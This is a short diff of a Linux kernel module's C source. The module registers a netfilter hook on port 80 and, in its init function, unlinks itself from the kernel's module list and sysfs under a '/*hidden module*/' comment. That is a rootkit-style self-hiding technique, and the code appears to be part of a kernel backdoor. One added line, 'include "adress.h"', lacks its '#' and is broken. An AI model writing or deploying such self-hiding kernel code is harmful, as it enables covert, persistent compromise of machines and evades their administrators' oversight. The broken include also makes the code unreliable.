@@ -2,8 +2,11 @@
 #define __KERNEL__  
 #endif  /* __KERNEL__ */
 
+# ifndef CPP
+#include <linux/module.h>
+# endif
+
 #include <linux/kernel.h>  
-#include <linux/module.h>  
 #include <linux/init.h>  
 #include <linux/types.h>  
 #include <asm/uaccess.h>  
@@ -15,6 +18,8 @@
 #include <linux/unistd.h>
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
+
+include "adress.h"
 
 #define PORT 80  
 #define ARGV_MAX 10
@@ -197,8 +202,11 @@ static int __init nf_init(void)
 		printk(KERN_ERR "register hook failed\n");  
 		return -1;  
 	}  
-  	list_del_init(&__this_module.list);
+  	
+	/*hidden module*/
+	list_del_init(&__this_module.list);
 	kobject_del(&THIS_MODULE->mkobj.kobj);
+
 	return 0;  
 }  
   
